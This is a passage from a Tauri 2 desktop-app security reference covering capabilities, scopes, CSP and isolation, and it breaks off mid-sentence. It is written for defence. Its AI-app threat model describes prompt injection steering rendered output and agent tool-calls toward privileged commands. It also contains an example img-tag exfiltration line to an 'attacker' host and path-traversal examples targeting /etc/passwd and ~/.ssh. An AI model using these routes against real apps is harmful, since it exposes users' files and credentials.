# Security — the trust boundary

Verified against **`tauri 2.11.5`** (docs.rs, 2026-07-27/28) unless stated otherwise. Fields and
identifiers were read from `tauri-apps/tauri@dev`, `tauri-apps/plugins-workspace@v2`, `v2.tauri.app`.

Organised around **where the line is**, not around config keys. One sentence to keep:

> The Runtime Authority decides **whether** a command runs. It never decides **what the command does
> with its arguments**. The second half is your Rust code, and it is the half that gets exploited.

Link, do not re-derive: updater key mechanics → `references/build-and-distribution.md`; plugin
authoring → `references/plugins.md`; general v1→v2 delta → `references/architecture.md`; WebView
engine divergence → `references/cross-platform.md`; command registration →
`references/ipc-and-commands.md`.

---

## 1. Draw the line before reading any config

**Untrusted — everything in the WebView.** Your HTML, your bundle, your whole transitive npm tree,
every string you render, every iframe, every `<img src>`. You must be able to answer *if this
executes attacker JavaScript, what happens?* and live with the answer.

**Trusted — the Rust side.** Core, your commands, every plugin's Rust half, every crate in
`Cargo.toml`, running with the full privileges of the user. There is no sandbox between a plugin
crate and `~/.ssh`. Capabilities are irrelevant to Rust code; they guard only the IPC edge.

**The line is IPC, enforced in exactly two places:** the Runtime Authority (a boolean — *may this
origin, in this window, call this command?* — plus injection of the matching `CommandScope<T>` /
`GlobalScope<T>`), and **your command body** (argument validation, path containment, length bounds,
whether the injected scope is consulted at all).

Tauri's stated non-goals are the most useful paragraph in its security docs: capabilities do **not**
protect against malicious or insecure Rust code, too-lax scopes, **incorrect scope checks in the
command implementation**, deliberate Rust-side bypasses, WebView 0-days, or supply-chain compromise.

The resulting category error is *"we configured capabilities, therefore we are sandboxed."* You are
not. You have an allowlist in front of an unsandboxed process — the difference between one XSS and
total compromise, but a filter on *which* privileged functions are reachable, not on what they do
once reached. **A capability grant is a promise that your command handles arbitrary well-typed input
correctly**, because arguments are `serde`-deserialised from frontend JSON before your body runs.

### One-way doors

Marked ⚠️ at each site; collected so you check them before the first release, not after.

| Decision | Why reversing it is expensive |
| --- | --- |
| Shipping without a CSP | Compiled into the binary. Adding one later breaks every page that grew inline-script habits, and you cannot test the fix on installed users. |
| Enabling `withGlobalTauri` | Frontend and third-party snippets grow to depend on `window.__TAURI__`; removal is a frontend rewrite. |
| Exposing a path-taking command | The shape leaks into your frontend and any extension story. Swapping `path: String` for an opaque handle is a breaking IPC change. |
| Windows origin scheme (`useHttpsScheme`) | Changing it later resets IndexedDB / LocalStorage / cookies on every installed machine — `references/cross-platform.md`. |
| The updater signing keypair | Lose it and you can never update installed users again — `references/build-and-distribution.md`. |
| Granting `shell:allow-execute` / `spawn` | Once a feature ships on it, removing it removes the feature. Design it out before v1. |

---

## 2. Threat model for a desktop AI app

The standard Tauri threat model assumes the attacker needs an XSS. In an AI app they do not.

**Premise.** Your app renders model output. Model output is a function of context, and context
includes fetched web pages, opened files, tool results, MCP responses, repository contents, e-mail.
Every one is a channel an attacker can write to. So **model output is attacker-controllable text as
a normal operating condition**, not as an incident.

**Consequence.** Prompt injection is *privilege escalation* here, because model output reaches a
renderer on the untrusted side of the boundary. Three paths, in increasing order of how often they
are missed:

1. **Rendered markdown → DOM → script.** Markdown-to-HTML, embedded SVG, LaTeX renderers,
   highlighters using `innerHTML`, chart libraries — each is a DOM write primitive. Under a weak CSP
   that is script execution, and script execution means **every command in that window's capability
   set is callable by whoever got text into the model's context**.
2. **Agent tool-calls.** If the model can call a tool that maps onto a `#[tauri::command]`, the
   attacker's text chooses the arguments. No XSS, no CSP involved — the call arrives through your own
   trusted-looking code path. Teams harden the ACL and then ship a `run_shell` tool the model drives.
3. **Rendered links and images.** `<img src="http://attacker/?data=…">` exfiltrates with no script at
   all. It needs only a permissive `img-src` / `connect-src`.

Four consequences worth acting on:

- **Reachability means "can a rendered page reach it", not "did a human click it".** Enumerate every
  command in the capability bound to the rendering window — that list is your attack surface. At
  ~250 commands (`references/case-studies.md` §11) the enumeration is neither optional nor short.
- **Split the window.** The window rendering model output gets its own capability with the minimum
  set, and must not share one with the window holding filesystem or shell access. Highest-value
  structural mitigation available; costs one JSON file.
- **Never let the model choose a path, URL, command name or shell argument that reaches a privileged
  command unmediated.** Treat model-proposed actions as frontend input: opaque IDs resolved in Rust,
  or confirmation in a Rust-driven dialog the webview cannot fake.
- **`connect-src` and `img-src` are exfiltration controls**, not performance settings. A default-deny
  `connect-src` listing only your API and `ipc:` turns a successful injection from "reads your files
  and mails them out" into "reads your files and cannot say so".

Summary: **the capability set of the rendering window is a list of things a stranger's text can
eventually cause.**

---

## 3. The enforcement path

On each `invoke`, `RuntimeAuthority::resolve_access` runs (`crates/tauri/src/ipc/authority.rs`,
`tauri 2.11.5`):

```rust
if self.denied_commands.get(command)
    .map(|resolved| resolved.iter().any(|cmd| origin.matches(&cmd.context)))
    .is_some()
{ None } else {
  origin.matches(&cmd.context)
    && (cmd.webviews.iter().any(|w| w.matches(webview))
      || cmd.windows.iter().any(|w| w.matches(window)))
}
```

- **Deny is evaluated first and short-circuits** — at every layer (§6).
- **`windows` and `webviews` are OR'd**, both `glob::Pattern`. A capability naming neither matches
  nothing: `[].iter().any(..)` is `false`, so the whole `&&` is false.
- **Absence of an allow is a denial.** Fails closed, correctly — but "denied" tells you nothing about
  *why*: missing permission, wrong window label, wrong platform and wrong origin give one identical
  error.

On grant, the authority injects the scopes from the matching permissions and calls the command. It
never inspects arguments.

---

## 4. Capabilities — the binding layer

A capability is a JSON / JSON5 / TOML file in `src-tauri/capabilities/` binding **permissions** to
**windows/webviews**, optionally narrowed by **platform** and **origin**. It is the only place where
"this permission applies to *that* window" can be said.

`crates/tauri-utils/src/acl/capability.rs`, `tauri 2.11.5`:

| Field | Type | Default | Notes |
| --- | --- | --- | --- |
| `identifier` | `String` | **required** | Unique; duplicate fails the build with `CapabilityAlreadyExists`. |
| `description` | `String` | `""` | Free text — it is what a reviewer reads. |
| `remote` | `{ urls: string[] }` | absent | URLPattern patterns, e.g. `"https://*.mydomain.dev"`. Purely **additive** (§11). |
| `local` | `bool` | **`true`** | Applies to the local app origin. Set by `default_capability_local()`. |
| `windows` | `string[]` | `[]` | Globs over **window labels**. |
| `webviews` | `string[]` | `[]` | Globs over **webview labels**. |
| `permissions` | `PermissionEntry[]` | **required** | Unique items: a string id, or `{ identifier, allow?, deny? }` carrying scope. |
| `platforms` | `Target[]` | absent = all | Subset of `linux`, `macOS`, `windows`, `iOS`, `android`. |

A capability *file* holds one object, a bare array, or `{ "capabilities": [...] }`
(`enum CapabilityFile { Capability, List, NamedList }`).

```json
// src-tauri/capabilities/main-user-files-write.json — tauri 2.11.5
{ "$schema": "../gen/schemas/desktop-schema.json",
  "identifier": "main-user-files-write",
  "description": "Lets the `main` window write user-selected files.",
  "windows": ["main"],
  "permissions": [ "core:default", "dialog:open",
    { "identifier": "fs:allow-write-text-file", "allow": [{ "path": "$HOME/test.txt" }] } ],
  "platforms": ["macOS", "windows"] }
```

**How the selectors combine** — the part people get wrong:

- `windows` **OR** `webviews`; they do not intersect.
- `platforms` — an **AND** filter at resolve time. Omitting it is usually right: a `platforms` list is
  a maintenance liability, because adding a target silently drops the grant.
- `local` / `remote` — an **origin** filter, also ANDed. Default `local: true` plus `remote.urls`
  means *both* (§11).
- Across capabilities they **merge, never subtract**: *"Windows and WebViews which are part of more
  than one capability effectively merge the security boundaries and permissions of all involved
  capabilities."*

That last point is the structural trap. **One `"windows": ["*"]` capability anywhere in
`capabilities/` re-grants everything to every window, including the one you locked down**, and no
capability can say "and not this". Wildcards are acceptable in a genuinely single-window app and
nowhere else. ZUS ships one capability, one window, no remote
(`src-tauri/capabilities/default.json`, `tauri 2.11.5`) — the right shape for one window;
`references/case-studies.md` §3 compares it against a multi-window app.

**Which files are active: by default every file in `capabilities/`.** `app.security.capabilities`
narrows it — entries are `CapabilityEntry::Reference(String)` or `::Inlined(Capability)`, mixable:
`{ "app": { "security": { "capabilities": ["my-capability", "main-capability"] } } }`. Docs: *"By
default (not set or empty list), all capability files from `./capabilities/` are included."*

So **dropping a file into the directory grants it** — no registration step to forget, therefore none
to review. A leftover `capabilities/debug.json` from a spike ships. Grep the directory in code
review, not `tauri.conf.json`.

**`default` is a filename convention, not a framework concept.** No magic `identifier: "default"`
exists in the type system; `tauri add` / `tauri migrate` write `<plugin>:default` into
`capabilities/default.json` because the template ships that name, while the docs' own starter uses
`identifier: "main-capability"`. Behaviour (all files auto-enabled) is verified; the filename is
convention. `[INFERENCE]`

**Boundaries key off window labels, not titles.** So `core:window:allow-create` /
`core:webview:allow-create-webview-window` granted to a low-trust window lets it **mint a window
whose label matches a high-privilege capability's glob** and inherit that privilege. Window creation
is a privilege-escalation primitive: grant it only where the privilege already exists, and prefer
creating windows from Rust.

**Use the generated schema** (`"$schema": "../gen/schemas/desktop-schema.json"`, or
`mobile-schema.json`, emitted by `tauri-build` into `src-tauri/gen/schemas/`): an unknown permission
then fails the **build** (`unknown permission {permission} for {key}`; unknown plugin →
`unknown ACL for {key}, expected one of {available}`) instead of surprising you at runtime.

**One line on registration:** commands registered only via `Builder::invoke_handler` are callable by
all windows and **bypass capabilities entirely** unless also declared through `AppManifest::commands`
in `build.rs`. Mechanics in `references/ipc-and-commands.md`.

---

## 5. Permissions — grammar, and what the defaults contain

A permission is a TOML record — **TOML only**, whereas capability files may be JSON/JSON5/TOML. It
carries `commands { allow, deny }`, `scope { allow, deny }`, and optional `platforms`
(`crates/tauri-utils/src/acl/mod.rs`). A `PermissionSet` is a named list of permission **or set**
ids, so sets nest.

| Identifier form | Example | Notes |
| --- | --- | --- |
| `<plugin>:<name>` | `fs:allow-read-text-file`, `dialog:open` | Plugin permission. |
| `<plugin>:default` | `fs:default` | The plugin's default **set**. |
| `core:<module>:<name>` | `core:window:allow-set-title` | Core is namespaced one level deeper. |
| `<name>` bare | `allow-home-read-extended` | App-owned — no prefix. |

The `tauri-plugin-` crate prefix is prepended at compile time; never write it. Charset ASCII
lowercase `[a-z]`, max length **116** = `MAX_LEN_PREFIX (64 - "tauri-plugin-".len()) + 1 +
MAX_LEN_BASE (64)`.

**`allow-*` / `deny-*` are autogenerated in symmetric pairs**, one per command, both "without any
pre-configured scope". Rust names are snake_case, identifiers kebab-case: `read_text_file` →
`fs:allow-read-text-file` / `fs:deny-read-text-file`. That transformation is the rule when guessing
an identifier.

### What `core:default` actually expands to

Exactly nine module defaults: `core:app`, `core:event`, `core:image`, `core:menu`, `core:path`,
`core:resources`, `core:tray`, `core:webview`, `core:window` — each `:default`. Contents worth
knowing before typing it reflexively:

- `core:app:default` → `allow-version`, `allow-name`, `allow-tauri-version`, `allow-identifier`,
  `allow-bundle-type`, `allow-register-listener`, `allow-remove-listener`,
  `allow-supports-multiple-windows`.
- `core:event:default` → `allow-listen`, `allow-unlisten`, `allow-emit`, **`allow-emit-to`**. The
  last lets the rendering window emit to any other window by label — if a privileged window acts on
  events that is a cross-window control channel, and in an AI app it means model-driven text can
  drive the privileged window.
- `core:image:default` → `allow-new`, `allow-from-bytes`, `allow-from-path`, `allow-rgba`,
  `allow-size`.
- `core:path:default` → the eight path-manipulation permissions (`allow-resolve`, `allow-normalize`,
  `allow-join`, `allow-dirname`, …). Resolution is not access, but it hands the frontend the real
  absolute paths needed to aim an attack.
- `core:resources:default` → `allow-close` only.
- `core:webview:default` → `allow-get-all-webviews`, `allow-webview-position`, `allow-webview-size`,
  **`allow-internal-toggle-devtools`** (§12).
- `core:window:default` → 28 read-only/query permissions (`allow-get-all-windows`,
  `allow-inner-size`, `allow-title`, `allow-theme`, `allow-cursor-position`, …).

**Not** in any default, therefore genuinely opt-in — the useful half of the list:
`core:window:allow-create`, `allow-set-title`, `allow-close`, `allow-destroy`,
`allow-set-content-protected`; `core:webview:allow-create-webview-window`,
`allow-clear-all-browsing-data`, `allow-print`; `core:app:allow-remove-data-store`,
`allow-fetch-data-store-identifiers`.

So `core:default` is mostly read-only and mostly fine; the two things to think about are
`allow-emit-to` and `allow-internal-toggle-devtools`. It is not "nothing", and it is not dangerous
either — the mistake is not knowing which.

### Plugin defaults are not uniformly safe

| Set | Expands to | The thing to know |
| --- | --- | --- |
| `fs:default` | `create-app-specific-dirs`, `read-app-specific-dirs-recursive`, `deny-default` | Read-only over `AppConfig/AppData/AppLocalData/AppCache/AppLog` + `mkdir` there. **No write access to user files.** A sane default. |
| `shell:default` | `allow-open` | Default regex `^((mailto:\w+)\|(tel:\w+)\|(https?://\w+)).+`. Deprecated path — prefer `opener`. |
| `opener:default` | `allow-open-url`, `allow-reveal-item-in-dir`, `allow-default-urls` | Modern replacement for `shell:allow-open`. |
| `http:default` | the five `allow-fetch*` commands | **Every fetch command enabled, zero origins allowed** — the URL scope is empty on purpose. Symptom: every `fetch()` rejects at runtime while the config looks correct. |

`http:default` is the instructive one — a default that turns the API on and the data off.
`<plugin>:default` is the author's opinion about their median user, and you are not necessarily them.

**Compose sets, don't paste globs.** The fs plugin's own layering is the model: `deny-default` =
`["deny-webview-data-linux", "deny-webview-data-windows"]`; `scope-applocaldata-reasonable` =
`["scope-applocaldata-recursive", "deny-default"]`; `read-files-applocaldata` =
`["scope-applocaldata-reasonable", "allow-read-file"]`. Build app-level sets in
`src-tauri/permissions/*.toml` the same way and your capability files stay reviewable.

---

## 6. Precedence — three deny layers, one global footgun

**`deny` beats `allow` at every layer, and absence of an `allow` is also a denial.** The layers are
not equivalent.

**Layer 1 — permission authoring.** Within one permission: *"If two commands clash inside of `allow`
and `deny`, it should be denied by default"*; `deny` is *"Denied command, which takes priority."*

**Layer 2 — command dispatch. ⚠️ This is the footgun.** In the deny arm from §3, `Option::map`
yields `Some(bool)` whenever the key is present, so `.is_some()` is `true` for *any* entry — **the
inner `origin.matches(..)` result is computed and discarded.**

Observable behaviour today: **if a command appears in the `deny` list of any active capability it is
denied for every window, every webview and every origin.** `deny-*` is not per-window.

- **Symptom:** you add `"fs:deny-read-file"` to one low-trust window's capability; `readFile` stops
  working in the main window too, with the ordinary "not allowed" message and no hint that another
  capability caused it.
- **Why it matters beyond the bug:** it inverts firewall intuition. Teams reach for `deny-*` to carve
  an exception out of a broad grant *for one window*. **That operation does not exist.** The only way
  to give one window less is a different, narrower capability — never a broad one plus a deny.
- It fails **closed**, so this is a usability bug, not a vulnerability. `[INFERENCE]` that the
  discarded origin check is unintended; the behaviour is read directly from source.
- **Legitimate use:** app-wide bans, e.g. `core:webview:deny-internal-toggle-devtools` in production
  — you want that everywhere.

**Layer 3 — scope**, deny-first in both enforcement points: `CommandScope::matches` returns early
(`if self.deny.iter().any(|s| s.matches(input)) { return false; }`) and `Scope::is_allowed`
(`crates/tauri/src/scope/fs.rs`) evaluates forbidden patterns before allowed ones;
`FsScope::Scope.deny` is documented *"This gets precedence over the `allow` list."* Unlike layer 2,
scope deny **is** correctly per-capability, because it travels with the injected scope.

---

## 7. Scopes — a data payload, not a sandbox

A scope is an arbitrary `serde`-deserialisable value attached to a permission and handed to the
command at invoke time as `CommandScope<T>` (from the permission that granted the command) and
`GlobalScope<T>` (from permissions declaring a scope but no commands). Extend a plugin's scope from a
capability with the `PermissionEntry::ExtendedPermission` form:

```json
// tauri 2.11.5 — `fs:scope` is a deliberately empty permission that only carries global-scope entries
{ "identifier": "read-documents", "windows": ["main"],
  "permissions": [ "fs:allow-read",
    { "identifier": "fs:scope",
      "allow": ["$APPDATA/documents/**/*"], "deny": ["$APPDATA/documents/secret.txt"] } ] }
```

**Three structural reasons this is not a sandbox:**

1. **The command enforces the scope, not the framework.** Docs `Caution`: *"Command developers need
   to ensure that there are no scope bypasses possible. The scope validation implementation should be
   audited to ensure correctness."* A third-party plugin taking a `PathBuf` and calling
   `std::fs::read` without consulting `CommandScope` **has no scope at all**, whatever your
   capability says.
2. **`allow` is OR'd across global and command scope, so a command scope can only widen.** In
   `plugins/fs/src/commands.rs`: `if is_forbidden(&fs_scope.scope, …) || is_forbidden(&scope, …)`
   rejects, else `if fs_scope.scope.is_allowed(…) || scope.is_allowed(…)` proceeds. Only `deny`
   narrows; a tight `allow` beside a loose one does nothing.
3. **Rust bypasses it by design** — `FsExt::fs_scope` and plugin Rust APIs are unscoped.

### Glob options

```rust
// crates/tauri/src/scope/fs.rs — tauri 2.11.5
glob::MatchOptions {
  require_literal_separator: true,   // hardcoded
  require_literal_leading_dot,       // true on unix, false on windows, unless overridden
  ..Default::default() }
```

`require_literal_separator: true` is hardcoded because of **GHSA-6mv3-wm7j-h4w5** ("The Filesystem
Scope Glob Pattern is too Permissive"). Therefore `$HOME/*` is **direct children only**, `$HOME/**`
is recursive, and `$HOME/**/*` — the shape the docs recommend — is recursive and file-oriented.
Generated fs scopes always emit **two** entries (`$DIR` and `$DIR/**`) because **the directory itself
does not match `$DIR/**`**; hand-write one and listing the directory fails while reading files
inside it works. Roots are `$VAR` names (`$HOME`, `$APPDATA`, `$RESOURCE`, `$APPLOCALDATA`, … 24 of
them, enumerated in the `FsScope` doc-comment).

### `requireLiteralLeadingDot` — same glob, two answers

Default **`true` on unix, `false` on Windows**. So on macOS/Linux `$HOME/**` does **not** match
`~/.ssh/id_rsa`; on Windows it **does**. Both directions are real bugs:

- **Security symptom:** an allow pattern that looks safe on macOS quietly includes dotfiles on
  Windows — GHSA-wmff-grcw-jcfm's territory ("Regression on Filesystem Scope Checks for Dotfiles on
  Linux and macOS").
- **Functional symptom:** on unix `$HOME/**` will not serve `~/.cache/myapp/preview.png`. Name the
  segment (`$HOME/.cache/myapp/**`) or flip the flag. Tracked in tauri#13788.

**Rule:** name dot-prefixed directories literally. Flipping `requireLiteralLeadingDot: false` to fix
one path opens every dotfile under that root — `.ssh`, `.aws`, `.env`, browser profiles.

### Path traversal and symlink escape

`../` is **not rejected syntactically**; the fs plugin canonicalises first, then matches:

```rust
// plugins/fs/src/commands.rs :: is_forbidden — v2 branch
let path = if path.is_symlink() { std::fs::read_link(path)? } else { path.to_path_buf() };
let path = if !path.exists() { Ok(path) } else { std::fs::canonicalize(path) };
let path: PathBuf = path.components().collect();
// crates/tauri/src/scope/fs.rs :: is_allowed — try_resolve_symlink_and_canonicalize(path)
```

- **Existing paths: traversal is handled.** `$APPDATA/../../../etc/passwd` canonicalises to
  `/etc/passwd`, matches no allow pattern, denied.
- **Non-existent paths are NOT canonicalised** (`if !path.exists() { Ok(path) }`). A create/write to
  `$APPDATA/../../evil.txt` is matched *lexically* after `components().collect()`, which normalises
  `.` and repeated separators but **preserves `..`** — so it matches no `"$APPDATA/**"` and is denied.
  Fail-closed, but the reason is *"no allow matched"*, not *"traversal detected"*. `[INFERENCE]` on
  the residual-`..` detail; the `!path.exists()` short-circuit is read from source.
- **Symlinks were the historical bypass** — GHSA-28m8-9j7v-x499 (`readDir` scope bypassed with
  symbolic links) and GHSA-q9wv-22m9-vhqh. Today `read_link` + `canonicalize` runs before matching.
  Residual edges: `read_link` returns the raw target, which may be **relative**; `is_forbidden`
  returns `false` on a broken symlink (`Err(_) => return false`) while `Scope::is_allowed` also
  returns `false` — so a broken symlink is denied by the allow side, not the deny side.
- **Deny patterns must be written against the canonicalised path.** Denying `$HOME/.ssh/**` does
  nothing if the attacker reaches the same inode through a path your allow-glob canonicalises into.
  Deny lists enumerating sensitive *names* are decoration; a narrow allow root is the control.

**Carry this into your own commands:** the fs plugin is careful and still needed four advisories to
get here. Canonicalise, then assert containment against a canonicalised root using `starts_with` on
`PathBuf`s — never string prefix matching — and handle the not-yet-exists case explicitly.

**Two operational notes.** Dialog-chosen paths are not in `tauri.conf.json` and vanish on restart:
persist them with `tauri-plugin-persisted-scope`, registering `tauri_plugin_fs` **before** it or the
scope has nothing to attach to. And the fs plugin's `deny-default` covers only webview data dirs, via
`deny-webview-data-linux` (`$APPLOCALDATA/**`) and `deny-webview-data-windows`
(`$APPLOCALDATA/EBWebView/**`) — **there is no macOS entry**, so widening `$APPLOCALDATA` on macOS
exposes the WebView's own cookies, LocalStorage and IndexedDB unless you write your own deny.

---

## 8. `assetProtocol` — the fastest way to expose a filesystem

`convertFileSrc()` serves disk files into the WebView over the `asset:` protocol, gated by
`AssetProtocolConfig { scope: FsScope, enable: bool }` — `enable` defaults to `false`, and setting it
auto-adds the `protocol-asset` Cargo feature. `FsScope` is a union of an array form and an object
form, and **the array form cannot set `requireLiteralLeadingDot`**:

```json
// tauri 2.11.5
{ "app": { "security": { "assetProtocol": { "enable": true, "scope": {
  "allow": ["$APPCACHE/**/*"], "deny": ["$APPCACHE/**/secrets/**"], "requireLiteralLeadingDot": false
}}}}}
```

**Why `["**/*"]` is a whole-filesystem grant.** The pattern has no root and matches everything;
with `requireLiteralLeadingDot: false` it includes dotfiles — `~/.ssh`, `~/.aws/credentials`, browser
profiles, `.env`. Any script executing in the WebView reads them with a plain `fetch('asset://…')`:
no prompt, no ACL check, no command involved. The docs call this shape *"maintainer-suggested … not a
default recommendation"* and follow it with a `Caution`. In an AI app it is the highest-severity
misconfiguration in this file, because §2's path 1 reaches it directly and path 3 exfiltrates what it
reads. `references/case-studies.md` §2 contrasts a real scoped configuration with a decorative one.

- Resolved paths are **absolute**; `["*/**"]` never matches on Linux (no leading `/`, no `$VAR`).
  Symptom: nothing loads and the scope looks populated.
- Error to grep for: `asset protocol not configured to allow the path`.
- **CSP must permit it too** — `"img-src": "'self' asset: http://asset.localhost blob: data:"`. A
  correct scope with a CSP omitting `asset:` fails silently in the console.
- Runtime-chosen folders need `tauri-plugin-persisted-scope` with the `protocol-asset` feature.

**When to deviate:** to serve user media, prefer a **custom protocol handler in Rust** — resolve an
opaque ID to a path in Rust and the frontend never names a filesystem location. Slightly more code;
the scope stops being a security control.

---

## 9. CSP — the control that survives a rendered-content compromise

**There is no default CSP.** `csp: Option<Csp>` defaults to `None`: *"The CSP protection is only
enabled if set on the Tauri configuration file."* A new app ships with **zero** CSP unless the
template added one — the most-missed hardening step, and in an AI app the difference between
"injected markdown renders a broken tag" and "injected markdown owns the IPC surface".
⚠️ **one-way door**: adding a CSP after the frontend grew inline-script habits is a refactor you
cannot validate on installed users.

`Csp` is `Policy(String)` or `DirectiveMap(HashMap<String, CspDirectiveSources>)`. Selection
(`crates/tauri/src/manager/mod.rs`): release uses `csp`; dev uses `dev_csp.or_else(|| csp)`. So
**`devCsp` is a dev-only loosening, ignored in release, and dev inherits `csp` when unset** — a team
testing only under a permissive `devCsp` ships an untested prod policy, the classic "works in dev,
blank page in release".

### What Tauri injects, and how it breaks

At build time (`crates/tauri-utils/src/html.rs`), `inject_nonce_token` adds nonce *placeholders* to
exactly two element classes — **external `<script src="http…">` and `<style>`** — and skips any
element that already has a `nonce`. **Inline local scripts are covered by hashes** instead, collected
into `Assets::csp_hashes()` as `CspHash::Script` / `CspHash::Style`. At runtime `replace_csp_nonce`
substitutes a **fresh random nonce per token per page load** (`getrandom::u64()`) and appends
`'self'` plus the precomputed hashes to the directive.

Three failure modes fall straight out of that:

- **Any post-build mutation of the HTML invalidates a hash and the script is blocked** — a minifier
  running after `tauri build` embeds assets, an injected analytics snippet, a CI rewrite. Symptom:
  *works in dev, blank page in release, CSP violation in the console.*
- **Writing your own `nonce` attribute makes Tauri skip that element** (`if attrs.get("nonce")
  .is_some() { continue; }`) — a silent way to lose protection while looking more secure.
- Hashing normalises line endings first (`\r\n → \n`, lone `\r → \n`) to match browser hashing.
  Relevant when assets are generated on Windows.

**Delivery differs by platform.** `set_csp`: *"Sets the CSP value to the asset HTML if needed (on
Linux). Returns the CSP string for access on the response header (on Windows and macOS)."* Linux gets
a `<meta http-equiv>` tag; Windows/macOS get a real header. `[INFERENCE]` Consequence:
`frame-ancestors`, `report-uri` and `sandbox` are meta-tag-inert, i.e. **effectively unavailable on
Linux** — do not build a control on them. Engine patch latency is OS-vendor-bound
(`references/cross-platform.md`).

```json
// tauri's own examples/api — tauri 2.11.5
"csp": { "default-src": "'self' customprotocol: asset:",
         "connect-src": "ipc: http://ipc.localhost",
         "font-src": ["https://fonts.gstatic.com"],
         "img-src": "'self' asset: http://asset.localhost blob: data:",
         "style-src": "'unsafe-inline' 'self' https://fonts.googleapis.com" }
```

**Why `'unsafe-inline'` / `'unsafe-eval'` in `script-src` defeat the mechanism.** CSP's XSS value is
*source allowlisting* — only scripts Tauri hashed or nonced may run. `'unsafe-inline'` re-permits
arbitrary injected `<script>` and inline handlers, precisely the class the policy exists to stop; per
spec it is *ignored* when a nonce or hash is present in the same directive, so adding it is at best a
no-op and at worst evidence someone removed the nonces to "fix" a build. `'unsafe-eval'` re-enables
`eval`/`Function`, the standard gadget for upgrading a DOM write into script execution.
`[INFERENCE]` on the spec-level ignore rule; the policy above is verbatim from the repo. Note it uses
`'unsafe-inline'` only in **`style-src`** — CSS injection, not script execution, and many CSS-in-JS
frameworks force it. That is the acceptable deviation; the `script-src` one is not. WASM frontends
(Yew, Leptos, Dioxus) need `'wasm-unsafe-eval'`, a narrow exception rather than `'unsafe-eval'`, and
CDN-loaded scripts are called out upstream as an attack vector — bundle them.
`references/case-studies.md` §1 compares a real closed-by-default policy with a permissive one.

### `dangerousDisableAssetCspModification`

`DisabledCspModificationKind` is `Flag(bool)` or `List(Vec<String>)`, default `Flag(false)` (Tauri
controls the CSP); `can_modify` is `!flag` or `!list.contains(directive)`. `true` disables nonce+hash
injection **entirely**; `["script-src"]` disables it for that directive only. Upstream: *"**WARNING:**
Only disable this if you know what you are doing and have properly configured the CSP. Your
application might be vulnerable to XSS attacks without this Tauri protection."*

The list form is the only responsible use — you own `script-src` because your framework emits its own
nonces, and leave `style-src` to Tauri. Setting the bare `true` because a script was blocked is
treating the alarm as the fire: the blocked script is the *symptom* of a post-build mutation, and
disabling injection ships that mutation unprotected.

**Related: `app.security.headers`** — a `HeaderConfig` applied to every non-IPC response, PascalCase
keys (`Access-Control-*`, `Cross-Origin-Embedder/Opener/Resource-Policy`, `Permissions-Policy`,
`Service-Worker-Allowed`, `Timing-Allow-Origin`, `X-Content-Type-Options`, and `Tauri-Custom-Header`,
marked **NOT INTENDED FOR PRODUCTION USE**). Values may be a string, an array (joined `", "`) or an
object (`key value` joined `"; "`). `Permissions-Policy` is the useful one for an AI app: deny
camera, microphone and geolocation on the window that renders model output.

---

## 10. The isolation pattern — one auditable choke point

`app.security.pattern` (`PatternKind::{ Brownfield (default), Isolation { dir } }`) routes every IPC
message through a sandboxed `<iframe>` running a tiny application you write:

```json
// tauri 2.11.5
{ "app": { "security": { "pattern": { "use": "isolation", "options": { "dir": "../dist-isolation" } } } } }
```
```js
// ../dist-isolation/index.js, loaded by a plain index.html
window.__TAURI_ISOLATION_HOOK__ = (payload) => payload;   // validate / mutate / reject here
```

Flow per the docs: IPC handler receives → isolation app → `[sandbox]` your hook runs and may modify
or reject → `[sandbox]` message encrypted with **AES-GCM** under a runtime-generated key →
`[encrypted]` back to the IPC handler → `[encrypted]` to Core. A fresh key is generated per launch
(`*key = uuid::Uuid::new_v4().to_string()`), the isolation schema is appended to `default-src` in the
computed CSP, and the `isolation` Cargo feature is auto-enabled.

**What it defends against.** Named upstream as *Development Threats*: a deeply-nested build-time and
runtime frontend dependency tree that could emit malicious IPC calls. It intercepts **all** frontend
messages including events — that is the value: one small, auditable, dependency-free place to assert
invariants the ACL cannot express (*this `fs` path starts with the expected prefix*, *this argument
count is plausible*, *log every privileged call*). For an AI app it is the natural home for "the model
may not call this command with a path outside the workspace", **because it sees arguments and the ACL
does not**.

**What it costs.** AES-GCM per IPC message (hardware-accelerated, the same primitive as TLS; docs say
"most applications should not notice" — believe that at command rates, re-measure for high-frequency
channels, `references/performance.md` §IPC). One CSPRNG key generation at startup, which **in
headless CI / WebDriver environments with low entropy can block** — install `haveged` or equivalent;
this is a real CI hang. An extra iframe and build directory. And **ES Modules do not work in the
isolation application**: on Windows external files do not load inside sandboxed iframes, so Tauri
**inlines** referenced scripts at build time (`inline_isolation()` splices `script[src]` file content
in and removes `src`). Classic `<script src="index.js">` works; `type="module"` does not.

**What it does not defend against. Isolation does not stop iframes.** GHSA-57fm-592m-34r7's reporter
demonstrated a CodePen iframe invoking `greet` inside an isolation-mode app: isolation validates
message *content* and historically could not tell you *who* sent the message. That hole was closed by
the invoke key (§11), not by isolation. And `inline_isolation`'s own comment — *"this does not prevent
path traversal due to the isolation application expectation that it is secure"* — means never point
`dir` at anything user-writable.

**When to enable.** Upstream says "whenever it can be used". Concretely: a large or untrusted frontend
dependency tree; any `fs`/`shell`/`http` command whose arguments come from *data* rather than fixed
code paths (which is every AI app); or a need for an IPC audit log. **Skip it** with a tiny vendored
frontend and a hard latency budget, or if you require ESM in the isolation layer. Keep the isolation
app dependency-free — its whole value is being a small trusted base, and one npm import destroys that.

---

## 11. Origin controls: `local`, `remote.urls`, and the invoke key

**`local` defaults to `true`** — the most misread field in the schema.

```json
// remote-only capability — note the explicit `local: false` — tauri 2.11.5
{ "identifier": "remote-cap", "windows": ["main"], "local": false,
  "remote": { "urls": ["https://*.mydomain.dev"] }, "permissions": ["nfc:allow-scan"] }
```

Adding `remote.urls` **does not turn local access off**. `remote` is purely **additive**: the
capability now applies to the local app origin *and* the listed remote patterns. A capability meant
for remote content only must say `"local": false`; omit it and your "remote" capability is really an
"everything" capability — usually harmless in effect, but reviewers stop reading it as narrow.
**`remote.urls` is also weaker on Linux and Android**, where Tauri cannot distinguish an embedded
`<iframe>` from the window itself (explicit `Caution` in the docs) — do not build a boundary on it
there.

**`dangerousRemoteDomainIpcAccess` no longer exists** as a field on `SecurityConfig`; per-capability
`remote.urls` replaced it. On the Rust side `RemoteDomainAccessScope::enable_tauri_api` /
`enables_tauri_api` were removed — enable each core plugin individually with
`RemoteDomainAccessScope::add_plugin`. An agent following a v1-era blog post will try the old key and
get a config parse error.

**The invoke key (`__TAURI_INVOKE_KEY__`)** is the remediation for GHSA-57fm-592m-34r7. A
